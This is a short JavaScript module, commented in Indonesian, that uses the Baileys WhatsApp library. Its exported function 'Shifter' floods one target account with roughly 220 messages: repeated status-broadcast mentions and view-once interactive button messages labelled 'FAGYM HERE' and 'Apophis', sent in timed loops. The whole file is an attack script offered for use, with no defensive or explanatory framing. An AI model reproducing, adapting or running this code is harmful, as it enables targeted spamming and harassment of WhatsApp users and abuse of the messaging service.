const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

// ── Helper functions (tidak di-export, hanya dipakai Shifter) ─────────────────

async function agus(sock, jid) {
    const msg = generateWAMessageFromContent(
        "status@broadcast",
        {
            extendedTextMessage: {
                text: "Halo",
                contextInfo: {
                    mentionedJid: [jid]
                }
            }
        },
        { userJid: sock.user.id }
    );

    await sock.relayMessage(
        "status@broadcast",
        msg.message,
        {
            messageId: msg.key.id,
            statusJidList: [jid]
        }
    );
}

async function agus2(sock, jid) {
    for (let i = 0; i < 10; i++) {
        const msg = generateWAMessageFromContent(jid, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: "FAGYM HERE" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Apophis",
                                        id: "apophis"
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { userJid: sock.user.id });

        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
        await new Promise(r => setTimeout(r, 500));
    }
}

// ── Helper ────────────────────────────────────────────────────────────────────
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ── Main function yang di-export ──────────────────────────────────────────────

async function Shifter(sock, jid) {
    for (let i = 0; i < 10; i++) {
        await agus(sock, jid);
        await sleep(1000);
        await agus2(sock, jid);
        await sleep(1000);
        await agus(sock, jid);
        await sleep(1000);
        await agus2(sock, jid);
        await sleep(1000);
    }
}

module.exports = Shifter;
